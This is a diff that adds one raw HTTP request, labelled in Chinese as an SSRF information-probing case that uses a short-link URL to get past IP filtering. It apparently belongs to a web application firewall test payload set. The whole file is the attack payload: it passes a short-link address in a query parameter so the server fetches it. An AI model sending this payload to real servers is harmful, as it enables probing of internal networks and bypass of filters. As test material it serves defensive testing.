@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_信息探测(短链接绕过)-06506961
+# 使用短链接地址绕过IP过滤。
+GET /?id=http:%2F%2F985.so%2F27g36&bid=hd_tag_m8mv24n0 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24n0
+RM-PRO-Token: 01e9e2e15ea1d747ca6399a9ca6a8f0b
+RM-PRO-Time: 1742808393251
+User-Agent: curl/7.83.1
+
